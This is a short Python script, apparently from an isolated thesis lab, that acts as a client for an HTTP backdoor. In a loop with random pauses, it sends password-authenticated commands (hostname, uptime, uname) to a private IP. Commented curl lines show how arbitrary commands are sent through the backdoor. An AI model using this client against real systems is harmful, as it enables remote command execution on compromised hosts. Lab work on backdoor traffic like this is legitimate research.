import random
import time

import requests

# curl --location --head 'IP:PORT' --header 'Content-Type: text/plain'
# curl --location --request POST 'IP:PORT' --header 'pwd: PASSWORD' --header 'Content-Type: text/plain' --data-raw 'COMMAND'

# IP/port of the HTTP backdoor and the demo password expected by it. These are
# lab placeholders for the isolated thesis testbed, not real credentials — set
# them to match your own environment.
IP = "192.168.1.43"
PORT = 1337
HEADERS = {
    "pwd": "password",
    "Content-Type": "text/plain",
}

PAUSE = range(2, 11, 1)
COMMANDS = ["hostname", "uptime", "uname"]
while True:
    data = random.choice(COMMANDS)
    print(data)
    response = requests.post("http://{}:{}".format(IP, PORT), headers=HEADERS, data=data)
    print(response.headers)

    time.sleep(random.choice(PAUSE))
